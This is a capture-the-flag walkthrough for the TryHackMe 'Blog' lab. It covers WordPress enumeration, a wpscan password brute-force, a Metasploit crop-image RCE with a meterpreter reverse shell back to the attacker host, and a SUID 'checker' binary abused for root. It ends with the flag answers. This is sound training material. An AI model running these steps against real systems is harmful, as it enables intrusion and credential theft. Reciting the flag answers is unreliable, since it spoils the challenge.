# Blog Walkthrough
### Link
- https://tryhackme.com/room/blog
---
# Task 1 

- First : **NMAP**+
```
sudo nmap -sC -sV -Pn 10.10.89.194
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-02 22:33 EST
Nmap scan report for 10.10.89.194
Host is up (0.40s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-01-03T03:34:07+00:00
| smb2-time: 
|   date: 2023-01-03T03:34:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.23 seconds
```

2 interesting findings : 

**smb share**
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```


**wordpress**
```
http-robots.txt: 1 disallowed entry 
|_/wp-admin/
```

Because this room is focus on Wordpress, I will start with **Wordpress** by using **wpscan**
```
+] URL: http://10.10.89.194/ [10.10.89.194]
[+] Started: Mon Jan  2 22:35:08 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.89.194/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.89.194/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.89.194/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.89.194/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.89.194/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.89.194/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.89.194/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <=============================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.89.194/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.89.194/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jan  2 22:35:30 2023
[+] Requests Done: 75
[+] Cached Requests: 5
[+] Data Sent: 14.487 KB
[+] Data Received: 19.668 MB
[+] Memory used: 165.008 MB
[+] Elapsed time: 00:00:21

```

Key findings : 

**Old wordpress version**
```
WordPress version 5.0 identified (Insecure, released on 2018-12-06).
```

**Users**
```
bjoel
kwheel
```

Let's try to find the password for these 2 users by using , one more time, **wpscan**
```
wpscan --url http://10.10.89.194/ -U blogusers.txt -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.89.194/ [10.10.89.194]
[+] Started: Mon Jan  2 22:45:00 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.89.194/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.89.194/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[SUCCESS] - kwheel / cutiepie1  
```

Now . with the user/password, we have a chance to access the admin portal

Be carefull, when you navigate in this portal, all link refered to **blog.thm** , that means we need to add the IP and this host name into our **/etc/hosts**

After that step, let's move and connect through the **Login Page**

After some quick research, this user doesn't have **privilege access**

Let's check with **searchploit** if we can find exploit for this old wordpress version
```
searchsploit wordpress 5.0.0      
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
WordPress 5.0.0 - Image Remote Code Execution                       | php/webapps/49512.py
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)         | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private P | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service             | php/dos/47800.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Met | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection           | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection         | php/webapps/48918.sh
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Another quick search directly from **Metasploit**
```
msf6 > search wordpress 5.0.0

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce                            
```

So et's go and use this exploit ^^
```
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-f
                                         ramework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.18.213.7      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
RHOSTS => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.4.2.132
LHOST => 10.4.2.132
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.4.2.132:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.89.194
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.4.2.132:4444 -> 10.10.89.194:60666 ) at 2023-01-03 13:22:24 +0900

meterpreter >
```

Let's use this command line to have a better way to work means **spwn TTY**

```
python -c 'import pty; pty.spawn("/bin/sh")'
```
```
meterpreter > shell
Process 1451 created.
Channel 1 created.
python -c 'import pty; pty.spawn("/bin/sh")'
$ $ pwd
pwd
/var/www/wordpress
$ whoami
whoami
www-data

```

Let's move to **user.txt** directory
```
$ cd /home
cd /home
$ ls -l
ls -l
total 4
drwxr-xr-x 4 bjoel bjoel 4096 May 26  2020 bjoel
$ cd bjoel
cd bjoel
$ ls -l
ls -l
total 72
-rw-r--r-- 1 bjoel bjoel 69106 May 26  2020 Billy_Joel_Termination_May20-2020.pdf
-rw-r--r-- 1 bjoel bjoel    57 May 26  2020 user.txt
$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Ok , we need to find a way to obtain enough privilege to read this file.

Let's check **SUID** file
```
find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
``` 

This binary lokks really interesting **checker**

We can download it and do some analyzis with **Ghidra**
```
int main(void) {
  char *adminEnv = getenv("admin");

  if (adminEnv == (char *)0x0) {
    puts("Not an Admin");
  } else {
    setuid(0);
    system("/bin/bash");
  }

  return 0;
}
```

Basically, if  we send add any value to the variable **admin** and use this binary, we will be able to elevate our privilege.

We can see the same informaiton with **ltrace**

```
ltrace checker
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

Let's add a random value to **admin** and use **checker**

```
$ admin=1 /usr/sbin/checker
admin=1 /usr/sbin/checker
root@blog:/home/bjoel#
```

We are **admin** !!!
```
root@blog:/home/bjoel# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

But we receive the same message so the correct **user.txt** file is stored to another place

```
root@blog:/home/bjoel# cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Search all **user.txt**
```
root@blog:/home/bjoel# find / -name user.txt
find / -name user.txt
/home/bjoel/user.txt
/media/usb/user.txt
```
```
root@blog:/media/usb# cat user.txt
cat user.txt
c8421899aae571f7af486492b71a8ab7
```
**Question**
#### What CMS was Billy using?
#### Answer : wordpress


**Question**
#### What version of the above CMS was being used?
#### Answer : 5.0

**Question**
#### Where was user.txt found?
#### Answer : /media/usb/

**Question**
#### user.txt
#### Answer : c8421899aae571f7af486492b71a8ab7


```
root@blog:/root# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 33 May 26  2020 root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```


**Question**
#### root.txt
#### Answer : 9a0b2b618bef9bfa7ac28c1353d9f318


